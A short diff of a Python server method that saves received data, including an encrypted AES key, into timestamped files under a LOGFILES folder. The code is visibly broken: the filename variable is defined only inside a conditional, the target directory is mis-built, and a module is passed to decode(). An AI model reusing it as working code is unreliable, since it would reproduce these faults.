@@ -103,14 +103,15 @@ class Server:
 	def save_recieved_file(self, address):
 		
 		# Ensure folder exists
-		save_folder = ('/Desktop/LOGFILES/' + str((address)[1]))
+		save_folder = ('/server/LOGFILES/')
+		save_file = ('/server/LOGFILES/' + str((address)[1]))
 
 		if not os.path.exists(save_folder):
 			os.makedirs(save_folder, exist_ok=True)
 			current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-			filename = os.path.join(save_folder, current_time + '.txt')
+			filename = os.path.join(save_file, current_time + '.txt')
 
-		import base64	
+		import base64
 
 		with open(filename, 'w', encoding='utf-8') as f:
 			f.write('encrypted_aes_key: ' + (self.encrypted_key).decode(base64) + '\n')
